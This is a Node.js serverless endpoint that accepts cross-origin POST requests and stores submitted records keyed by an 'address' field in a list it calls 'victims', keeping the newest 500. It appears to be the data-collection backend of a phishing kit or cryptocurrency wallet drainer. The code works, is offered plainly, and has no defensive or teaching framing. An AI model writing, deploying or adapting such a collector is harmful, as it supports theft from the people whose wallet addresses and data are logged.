const store = require('./_store');

module.exports = (req, res) => {
  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') { res.statusCode = 204; return res.end(); }
  if (req.method !== 'POST') {
    res.statusCode = 405;
    return res.end(JSON.stringify({ ok: false }));
  }
  let body = '';
  req.on('data', chunk => body += chunk);
  req.on('end', async () => {
    try {
      const data = JSON.parse(body);
      if (data.address) {
        data.timestamp = Date.now();
        const list = await store.getVictims();
        const idx = list.findIndex(v => v.address === data.address);
        if (idx !== -1) list[idx] = data;
        else list.push(data);
        if (list.length > 500) list.splice(0, list.length - 500);
        await store.setVictims(list);
      }
    } catch (e) {}
    res.end(JSON.stringify({ ok: true }));
  });
};
